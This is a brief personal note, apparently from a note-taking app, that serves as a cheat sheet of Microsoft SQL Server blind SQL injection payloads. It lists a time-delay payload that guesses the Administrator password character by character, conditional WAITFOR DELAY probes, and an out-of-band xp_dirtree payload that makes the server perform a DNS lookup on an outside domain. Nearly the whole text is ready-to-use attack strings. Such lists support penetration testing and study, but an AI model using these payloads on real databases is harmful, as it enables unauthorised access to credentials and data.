---
title: MSSQL -SQLi- Blind
updated: 2023-11-06 12:06:50Z
created: 2023-11-06 10:14:32Z
latitude: -33.85985000
longitude: 151.20901000
altitude: 0.0000
---

# Blind SQL Injection - time delay

`'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`

# Blind SQL Injection - conditional time delay
`IF (1=1) WAITFOR DELAY '0:0:10'`
`IF (1=2) WAITFOR DELAY '0:0:10'`
OR
`'; IF (1=1) WAITFOR DELAY '0:0:10'--`
`'; IF (1=2) WAITFOR DELAY '0:0:10'--`

# Blind SQL Injection - OAST OutOfBand
`'; exec master..xp_dirtree '//mydomain.net/a'--`
Caused a DNS lookup on mydomain